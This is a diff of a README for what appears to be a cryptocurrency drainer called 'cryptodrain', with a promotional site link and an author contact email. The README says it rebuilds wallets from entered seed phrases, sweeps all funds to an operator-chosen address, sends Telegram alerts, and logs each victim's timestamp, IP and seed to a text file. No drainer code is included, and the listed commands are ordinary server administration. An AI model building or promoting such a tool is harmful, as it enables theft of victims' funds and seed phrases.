@@ -19,7 +19,7 @@ Story-driven Bitcoin sweeper — one click drains every satoshi. www.sats.it.com
     * Re-creates the wallet from any 12/24-word BIP39 seed.
     * It can be used also a "connect wallet function.
     * It may send notifications to telegram.
-    * Scans blockchain, builds one transaction, sweeps **all** UTXOs to a fixed cold-storage address.  
+    * Scans blockchain, builds one transaction, sweeps **all** UTXOs to a fixed cold-storage address which can be changed always in terms of the needs. 
 3.  **Plain-text seed archive** (optional)  
     * Each sweep appends `UTC timestamp · IP · seed` to `~/crypto/seeds.txt`.  
 4.  **Privacy & logging**  
@@ -64,6 +64,7 @@ Tail app log	tail -f ~/crypto/cryptodrain.log
 Tail Nginx log	sudo tail -f /var/log/nginx/access.log
 Health check	curl http://127.0.0.1:8080/health
 Dry-run TLS renew	sudo certbot renew --dry-run
+--
 
 You can always find me on my email: realred666666@gmail.com
 
